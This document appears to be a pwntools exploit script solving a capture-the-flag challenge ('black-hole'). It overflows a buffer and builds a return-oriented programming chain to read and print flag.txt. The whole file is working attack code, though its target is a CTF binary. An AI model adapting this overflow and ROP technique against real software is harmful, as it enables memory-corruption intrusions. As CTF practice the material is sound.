#!/usr/bin/env python

from pwn import *
import sys

### overload buffer
payload = 140 * 'A'
payload += p8(151)

### find and add pop rdi gadget
context.clear(arch='amd64')
rop = ROP('black-hole')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)
payload += p64(pop_rdi)

### find location of ./flag.txt
binary = ELF('black-hole')
flag_txt = next(binary.search('./flag.txt'))
payload += p64(flag_txt)

### readFile with pointer in rax
readFile = binary.symbols['readFile']
payload += p64(readFile)

### find mov rdi,rax; call puts
# objdump -M intel -d black-hole | grep -B1 puts
# ...
#  400bd0:	48 89 c7             	mov    rdi,rax
#  400bd3:	e8 58 fb ff ff       	call   400730 <puts@plt>
payload += p64(0x400bd0)

### get the flag
p = process('./black-hole')
#p = remote('pwn.ctf.b01lers.com',1005)
p.recvuntil('Name: ')
p.sendline(payload)
p.recvuntil('> ')
for i in range(8):
	p.sendline('d')

### let it all out man
p.stream()
